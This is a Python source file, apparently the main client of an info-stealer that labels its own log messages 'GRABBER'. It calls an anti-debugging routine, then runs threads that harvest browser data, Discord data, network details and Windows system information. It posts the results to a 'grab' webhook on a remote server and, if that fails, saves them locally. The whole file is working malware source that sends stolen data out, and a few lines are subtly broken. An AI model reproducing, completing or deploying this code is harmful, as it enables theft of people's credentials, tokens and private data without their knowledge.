import os
import pip
import json

from modules.AntiVM import antidebug

from service.Paths import generateWindowsPaths, generateMacPaths
from service.ThreadHandler import Thread
from handler import find_browsers_data, find_discord_data, find_network_data, handle_windows, find_windows_data

from service.functions import find_computerName, saveAsDataTable

try:
    import requests
except:
    pip.main(['install', 'requests'])
    import requests


class Client:
    def __init__(self) -> None:
        # Check if we're on windows
        if os.name == "nt":
            generateWindowsPaths()
        elif os.name == "posix":
            generateMacPaths()
        # self.webhook_uri = "https://grabbed.onrender.com/grabify"
        # self.webhook_uri = f"https://grabbed.onrender.com/api/v2/scan/admin/grab"
        self.webhook_uri = "http://192.168.98.26:8080/api/v2/scan/admin/grab"

    import json

    def send_data(self, browser_data: dict, discord_data: dict, network_data: dict, computer_data: dict):
        def convert_bytes_to_str(data):
            return {k: v.decode("utf-8") if isinstance(v, bytes) else v for k, v in data.items()}

        browser_data_str = convert_bytes_to_str(
            browser_data) if browser_data else {}
        discord_data_str = convert_bytes_to_str(
            discord_data) if discord_data else {}
        network_data_str = convert_bytes_to_str(
            network_data) if network_data else {}
        computer_data_str = convert_bytes_to_str(
            computer_data) if computer_data else {}

        data = {
            "type": "information",
            "user": find_computerName(),
            "browser": json.dumps(browser_data_str, allow_nan=True, default=str, skipkeys=True),
            "discord": json.dumps(discord_data_str, allow_nan=True, default=str, skipkeys=True),
            "network": json.dumps(network_data_str, allow_nan=True, default=str, skipkeys=True),
            "computer": json.dumps(computer_data_str, allow_nan=True, default=str, skipkeys=True),
        }

        # try:
        print("GRABBER :: Sending data to server", self.webhook_uri)

        try:
            requests.post(self.webhook_uri, json=data, timeout=10)
        except Exception as e:
            print(f"GRABBER :: Failed to send data to server. Error: {e}")
            print(f"GRABBER :: Moving towards offline mode.")

            try:
                cur_path = os.path.dirname(os.path.realpath(__file__))
                root_path = os.path.abspath(os.path.join(cur_path, os.pardir))

                os.makedirs(root_path + "/" + find_computerName())

                saveAsDataTable(json.dumps(
                    browser_data_str, allow_nan=True, default=str, skipkeys=True), "Browser")
                if self.discord_data_str is not None:
                    saveAsDataTable(json.dumps(
                        discord_data_str, allow_nan=True, default=str, skipkeys=True), "Discord")

                if self.network_data_str is not None:
                    saveAsDataTable(json.dumps(
                        network_data_str, allow_nan=True, default=str, skipkeys=True), "Network")
            except Exception as e:
                print(f"GRABBER :: Failed to save data. Error: {e}")
        # except Exception as e:
        #     print(f"GRABBER :: Failed to send data to server. Error: {e}")

    def lifespan(self):
        """The main function of the client. Handles whats going to happen when the client is running."""
        antidebug()
        # os.mkdir(root_path + "/" + find_computerName())
        # print(root_path + "/" + find_computerName())

        browser_thread = Thread(target=find_browsers_data)
        browser_thread.start()

        discord_thread = Thread(target=find_discord_data)
        discord_thread.start()

        network_thread = Thread(target=find_network_data)
        network_thread.start()

        computer_thread = Thread(target=find_windows_data)
        computer_thread.start()

        browser_thread.join()

        discord_thread.join()

        network_thread.join()

        computer_thread.join()
        self.send_data(browser_thread.result,
                       discord_thread.result, network_thread.result, computer_thread.result)

        # saveAsDataTable(self.browser_data, "Browser")
        # if self.discord_data is not None:
        #    saveAsDataTable(self.discord_data, "Discord")

        handle_windows()


if __name__ == "__main__":
    client = Client()
    client.lifespan()
